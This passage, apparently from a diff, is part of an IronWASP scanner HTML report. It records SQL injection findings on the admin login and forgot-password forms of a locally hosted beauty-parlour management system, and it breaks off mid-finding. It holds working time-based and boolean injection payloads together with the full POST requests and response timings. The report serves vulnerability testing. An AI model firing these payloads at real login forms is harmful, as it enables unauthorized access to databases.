+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/admin/</span></td></div></tr>
+<tr><div class='affected_parameter'><td><span class='fname'>Affected Parameter:</span></td><td>password</td></div></tr>
+<tr><div class='affected_section'><td><span class='fname'>Parameter Location:</span></td><td>Body</td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>SQL Injection was identified in the <span class='ico'><b>password</b></span> parameter of the <span class='ico'><b>Body</b></span> section of the scanned request.<br><br>SQL Injection is an issue where it is possible execute SQL queries on the database being used on the server-side. For more details on this issue refer <span class='icb'>https://www.owasp.org/index.php/SQL_Injection</span><br><br></div>
+<div class='reason_section_title'>Reasons:</div>
+IronWASP has reported this issue because of the following reasons:<br>
+<div class='reason'><div class='reason_title'>Reason 1:</div>
+IronWASP sent <span class='hlg'>&quot; or sleep(5)#</span> as payload to the application. This payload has a small snippet of SQL code that will cause the database server to sleep for <span class='hlg'>5000</span> milliseconds. If this code is executed then the application will return the response <span class='hlg'>5000</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>10504</span> milliseconds. Normally this particular request is processed at around </span>6</span> milliseconds. This indicates that the injected SQL code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a SQL query snippet which if executed will cause a delay of 5000 milliseconds. The payload is &quot; or sleep(5)#</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/ HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>username=yyyyy&amp;password=<span class='hlg'>%22+or+sleep(5)%23</span>&amp;login=Sign+In<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 10504 milliseconds to get this response. It took so long because of the 5000 milliseconds delay caused by the payload.</span><br><br>
+</div>
+</div>
+<div class='reason'><div class='reason_title'>Reason 2:</div>
+IronWASP sent <span class='hlg'>&quot; or sleep(5)=&quot;</span> as payload to the application. This payload has a small snippet of SQL code that will cause the database server to sleep for <span class='hlg'>5000</span> milliseconds. If this code is executed then the application will return the response <span class='hlg'>5000</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>10106</span> milliseconds. Normally this particular request is processed at around </span>6</span> milliseconds. This indicates that the injected SQL code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a SQL query snippet which if executed will cause a delay of 5000 milliseconds. The payload is &quot; or sleep(5)=&quot;</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/ HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>username=yyyyy&amp;password=<span class='hlg'>%22+or+sleep(5)%3d%22</span>&amp;login=Sign+In<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 10106 milliseconds to get this response. It took so long because of the 5000 milliseconds delay caused by the payload.</span><br><br>
+</div>
+</div>
+</div>
+<div class='finding' id='finding10'>
+<div class='high_finding_title'>SQL Injection Detected</div>
+<div class='finding_nav_links'><a href='#finding9'>&lt;&lt;&lt;</a><a href='#finding11'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</td><td></span>Vulnerability</td></div></tr>
+<tr><div class='severity'><td><span class='fname'>Severity:</span></td><td><span class='icr'>High</span></td></div></tr>
+<tr><div class='confidence'><td><span class='fname'>Confidence:</span></td><td>Medium</td></div>
+</tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Active Scanning</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php</span></td></div></tr>
+<tr><div class='affected_parameter'><td><span class='fname'>Affected Parameter:</span></td><td>contactno</td></div></tr>
+<tr><div class='affected_section'><td><span class='fname'>Parameter Location:</span></td><td>Body</td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>SQL Injection was identified in the <span class='ico'><b>contactno</b></span> parameter of the <span class='ico'><b>Body</b></span> section of the scanned request.<br><br>SQL Injection is an issue where it is possible execute SQL queries on the database being used on the server-side. For more details on this issue refer <span class='icb'>https://www.owasp.org/index.php/SQL_Injection</span><br><br></div>
+<div class='reason_section_title'>Reasons:</div>
+IronWASP has reported this issue because of the following reason:<br>
+<div class='reason'><div class='reason_title'>Reason:</div>
+IronWASP sent four payloads to the application with SQL code snippets in them.<br>Payload A - <span class='hlg'>iiixxx' or 's'='s</span><br>Payload B - <span class='hlg'>iiixxx' or 's'='r</span><br>Payload C - <span class='hlg'>iiixxx' or 't'='t</span><br>Payload D - <span class='hlg'>iiixxx' or 't'='r</span><br>Payload A and C have a boolean condition after the <span class='hlg'>OR</span> keyword that will evaluate to true. The boolean condition in Payload B and D would evaluate to false.<br>The response for Payload A and C were similar to each other and were different from the response received for Payload B and D. This indicates that the application was actually evaluating the boolean condition in the payloads. So since Payload A and C both has a true boolean condition their responses are similar, C and D had a false boolean condition.<br>If the application was not actually evaluating the boolean condition then all four payload should have returned very similar responses. Therefore this indicates that SQL syntax from the payload is executed as part of the SQL query on the server.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+Manually analyze the responses received for the four payloads and confirm if the type of similarity explained above actually exists in them. Try resending the same payloads again but with values in the boolean expression and check if this behaviour is repeated.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 's'='s which evaluates to true. The payload is iiixxx' or 's'='s</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=iii&amp;contactno=<span class='hlg'>iiixxx'+or+'s'%3d's</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the first boolean true condition based payload. This response is equal to the response of the second boolean true condition payload and different from the responses of the boolean false condition payloads.</span><br><br>
+</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 's'='r which evaluates to false. The payload is iiixxx' or 's'='r</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=iii&amp;contactno=<span class='hlg'>iiixxx'+or+'s'%3d'r</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the first boolean false condition based payload. This response is equal to the response of the second boolean false condition payload and different from the responses of the boolean true condition payloads.</span><br><br>
+</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 't'='t which evaluates to true. The payload is iiixxx' or 't'='t</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=iii&amp;contactno=<span class='hlg'>iiixxx'+or+'t'%3d't</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the second boolean true condition based payload. This response is equal to the response of the first boolean true condition payload and different from the responses of the boolean false condition payloads.</span><br><br>
+</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 't'='r which evaluates to false. The payload is iiixxx' or 't'='r</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=iii&amp;contactno=<span class='hlg'>iiixxx'+or+'t'%3d'r</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the second boolean false condition based payload. This response is equal to the response of the first boolean false condition payload and different from the responses of the boolean true condition payloads.</span><br><br>
+</div>
+</div>
+</div>
+<div class='finding' id='finding11'>
+<div class='high_finding_title'>SQL Injection Detected</div>
+<div class='finding_nav_links'><a href='#finding10'>&lt;&lt;&lt;</a><a href='#finding12'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</td><td></span>Vulnerability</td></div></tr>
+<tr><div class='severity'><td><span class='fname'>Severity:</span></td><td><span class='icr'>High</span></td></div></tr>
+<tr><div class='confidence'><td><span class='fname'>Confidence:</span></td><td>Medium</td></div>
+</tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Active Scanning</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/admin/</span></td></div></tr>
+<tr><div class='affected_parameter'><td><span class='fname'>Affected Parameter:</span></td><td>username</td></div></tr>
+<tr><div class='affected_section'><td><span class='fname'>Parameter Location:</span></td><td>Body</td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>SQL Injection was identified in the <span class='ico'><b>username</b></span> parameter of the <span class='ico'><b>Body</b></span> section of the scanned request.<br><br>SQL Injection is an issue where it is possible execute SQL queries on the database being used on the server-side. For more details on this issue refer <span class='icb'>https://www.owasp.org/index.php/SQL_Injection</span><br><br></div>
+<div class='reason_section_title'>Reasons:</div>
+IronWASP has reported this issue because of the following reason:<br>
+<div class='reason'><div class='reason_title'>Reason:</div>
+IronWASP sent <span class='hlg'>' or sleep(5)#</span> as payload to the application. This payload has a small snippet of SQL code that will cause the database server to sleep for <span class='hlg'>5000</span> milliseconds. If this code is executed then the application will return the response <span class='hlg'>5000</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>10887</span> milliseconds. Normally this particular request is processed at around </span>6</span> milliseconds. This indicates that the injected SQL code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a SQL query snippet which if executed will cause a delay of 5000 milliseconds. The payload is ' or sleep(5)#</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/ HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>username=<span class='hlg'>'+or+sleep(5)%23</span>&amp;password=nnnn&amp;login=Sign+In<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 10887 milliseconds to get this response. It took so long because of the 5000 milliseconds delay caused by the payload.</span><br><br>
+</div>
+</div>
+</div>
+<div class='finding' id='finding12'>
+<div class='high_finding_title'>SQL Injection Detected</div>
+<div class='finding_nav_links'><a href='#finding11'>&lt;&lt;&lt;</a><a href='#finding13'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</td><td></span>Vulnerability</td></div></tr>
+<tr><div class='severity'><td><span class='fname'>Severity:</span></td><td><span class='icr'>High</span></td></div></tr>
+<tr><div class='confidence'><td><span class='fname'>Confidence:</span></td><td>Medium</td></div>
+</tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Active Scanning</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/admin/</span></td></div></tr>
+<tr><div class='affected_parameter'><td><span class='fname'>Affected Parameter:</span></td><td>username</td></div></tr>
+<tr><div class='affected_section'><td><span class='fname'>Parameter Location:</span></td><td>Body</td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>SQL Injection was identified in the <span class='ico'><b>username</b></span> parameter of the <span class='ico'><b>Body</b></span> section of the scanned request.<br><br>SQL Injection is an issue where it is possible execute SQL queries on the database being used on the server-side. For more details on this issue refer <span class='icb'>https://www.owasp.org/index.php/SQL_Injection</span><br><br></div>
+<div class='reason_section_title'>Reasons:</div>
+IronWASP has reported this issue because of the following reason:<br>
+<div class='reason'><div class='reason_title'>Reason:</div>
+IronWASP sent <span class='hlg'>' or sleep(5)#</span> as payload to the application. This payload has a small snippet of SQL code that will cause the database server to sleep for <span class='hlg'>5000</span> milliseconds. If this code is executed then the application will return the response <span class='hlg'>5000</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>10058</span> milliseconds. Normally this particular request is processed at around </span>9</span> milliseconds. This indicates that the injected SQL code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a SQL query snippet which if executed will cause a delay of 5000 milliseconds. The payload is ' or sleep(5)#</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/ HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>username=<span class='hlg'>'+or+sleep(5)%23</span>&amp;password=ssss&amp;login=Sign+In<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 10058 milliseconds to get this response. It took so long because of the 5000 milliseconds delay caused by the payload.</span><br><br>
+</div>
+</div>
+</div>
+<div class='finding' id='finding13'>
+<div class='high_finding_title'>SQL Injection Detected</div>
+<div class='finding_nav_links'><a href='#finding12'>&lt;&lt;&lt;</a><a href='#finding14'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</td><td></span>Vulnerability</td></div></tr>
+<tr><div class='severity'><td><span class='fname'>Severity:</span></td><td><span class='icr'>High</span></td></div></tr>
+<tr><div class='confidence'><td><span class='fname'>Confidence:</span></td><td>Medium</td></div>
+</tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Active Scanning</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/admin/</span></td></div></tr>
+<tr><div class='affected_parameter'><td><span class='fname'>Affected Parameter:</span></td><td>login</td></div></tr>
+<tr><div class='affected_section'><td><span class='fname'>Parameter Location:</span></td><td>Body</td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>SQL Injection was identified in the <span class='ico'><b>login</b></span> parameter of the <span class='ico'><b>Body</b></span> section of the scanned request.<br><br>SQL Injection is an issue where it is possible execute SQL queries on the database being used on the server-side. For more details on this issue refer <span class='icb'>https://www.owasp.org/index.php/SQL_Injection</span><br><br></div>
+<div class='reason_section_title'>Reasons:</div>
+IronWASP has reported this issue because of the following reasons:<br>
+<div class='reason'><div class='reason_title'>Reason 1:</div>
+IronWASP sent <span class='hlg'>&quot; or sleep(5)#</span> as payload to the application. This payload has a small snippet of SQL code that will cause the database server to sleep for <span class='hlg'>5000</span> milliseconds. If this code is executed then the application will return the response <span class='hlg'>5000</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>9051</span> milliseconds. Normally this particular request is processed at around </span>9</span> milliseconds. This indicates that the injected SQL code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a SQL query snippet which if executed will cause a delay of 5000 milliseconds. The payload is &quot; or sleep(5)#</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/ HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>username=yyyyy&amp;password=yyyyy&amp;login=<span class='hlg'>%22+or+sleep(5)%23</span><br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 9051 milliseconds to get this response. It took so long because of the 5000 milliseconds delay caused by the payload.</span><br><br>
+</div>
+</div>
+<div class='reason'><div class='reason_title'>Reason 2:</div>
+IronWASP sent <span class='hlg'>&quot; or sleep(5)=&quot;</span> as payload to the application. This payload has a small snippet of SQL code that will cause the database server to sleep for <span class='hlg'>5000</span> milliseconds. If this code is executed then the application will return the response <span class='hlg'>5000</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>10029</span> milliseconds. Normally this particular request is processed at around </span>9</span> milliseconds. This indicates that the injected SQL code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a SQL query snippet which if executed will cause a delay of 5000 milliseconds. The payload is &quot; or sleep(5)=&quot;</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/ HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>username=yyyyy&amp;password=yyyyy&amp;login=<span class='hlg'>%22+or+sleep(5)%3d%22</span><br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 10029 milliseconds to get this response. It took so long because of the 5000 milliseconds delay caused by the payload.</span><br><br>
+</div>
+</div>
+<div class='reason'><div class='reason_title'>Reason 3:</div>
+IronWASP sent <span class='hlg'>&quot;;waitfor delay '0:0:5'--</span> as payload to the application. This payload has a small snippet of SQL code that will cause the database server to sleep for <span class='hlg'>5000</span> milliseconds. If this code is executed then the application will return the response <span class='hlg'>5000</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>10413</span> milliseconds. Normally this particular request is processed at around </span>9</span> milliseconds. This indicates that the injected SQL code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a SQL query snippet which if executed will cause a delay of 5000 milliseconds. The payload is &quot;;waitfor delay '0:0:5'--</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/ HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>username=yyyyy&amp;password=yyyyy&amp;login=<span class='hlg'>%22%3bwaitfor+delay+'0%3a0%3a5'--</span><br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 10413 milliseconds to get this response. It took so long because of the 5000 milliseconds delay caused by the payload.</span><br><br>
+</div>
+</div>
+</div>
+<div class='finding' id='finding14'>
+<div class='high_finding_title'>SQL Injection Detected</div>
+<div class='finding_nav_links'><a href='#finding13'>&lt;&lt;&lt;</a><a href='#finding15'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</td><td></span>Vulnerability</td></div></tr>
+<tr><div class='severity'><td><span class='fname'>Severity:</span></td><td><span class='icr'>High</span></td></div></tr>
+<tr><div class='confidence'><td><span class='fname'>Confidence:</span></td><td>Medium</td></div>
+</tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Active Scanning</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php</span></td></div></tr>
+<tr><div class='affected_parameter'><td><span class='fname'>Affected Parameter:</span></td><td>email</td></div></tr>
+<tr><div class='affected_section'><td><span class='fname'>Parameter Location:</span></td><td>Body</td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>SQL Injection was identified in the <span class='ico'><b>email</b></span> parameter of the <span class='ico'><b>Body</b></span> section of the scanned request.<br><br>SQL Injection is an issue where it is possible execute SQL queries on the database being used on the server-side. For more details on this issue refer <span class='icb'>https://www.owasp.org/index.php/SQL_Injection</span><br><br></div>
+<div class='reason_section_title'>Reasons:</div>
+IronWASP has reported this issue because of the following reason:<br>
+<div class='reason'><div class='reason_title'>Reason:</div>
+IronWASP sent <span class='hlg'>' or sleep(5)#</span> as payload to the application. This payload has a small snippet of SQL code that will cause the database server to sleep for <span class='hlg'>5000</span> milliseconds. If this code is executed then the application will return the response <span class='hlg'>5000</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>10410</span> milliseconds. Normally this particular request is processed at around </span>24</span> milliseconds. This indicates that the injected SQL code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a SQL query snippet which if executed will cause a delay of 5000 milliseconds. The payload is ' or sleep(5)#</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=<span class='hlg'>'+or+sleep(5)%23</span>&amp;contactno=ssss&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 10410 milliseconds to get this response. It took so long because of the 5000 milliseconds delay caused by the payload.</span><br><br>
+</div>
+</div>
+</div>
+<div class='finding' id='finding15'>
+<div class='high_finding_title'>SQL Injection Detected</div>
+<div class='finding_nav_links'><a href='#finding14'>&lt;&lt;&lt;</a><a href='#finding16'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</td><td></span>Vulnerability</td></div></tr>
+<tr><div class='severity'><td><span class='fname'>Severity:</span></td><td><span class='icr'>High</span></td></div></tr>
+<tr><div class='confidence'><td><span class='fname'>Confidence:</span></td><td>Medium</td></div>
+</tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Active Scanning</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php</span></td></div></tr>
+<tr><div class='affected_parameter'><td><span class='fname'>Affected Parameter:</span></td><td>contactno</td></div></tr>
+<tr><div class='affected_section'><td><span class='fname'>Parameter Location:</span></td><td>Body</td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>SQL Injection was identified in the <span class='ico'><b>contactno</b></span> parameter of the <span class='ico'><b>Body</b></span> section of the scanned request.<br><br>SQL Injection is an issue where it is possible execute SQL queries on the database being used on the server-side. For more details on this issue refer <span class='icb'>https://www.owasp.org/index.php/SQL_Injection</span><br><br></div>
+<div class='reason_section_title'>Reasons:</div>
+IronWASP has reported this issue because of the following reasons:<br>
+<div class='reason'><div class='reason_title'>Reason 1:</div>
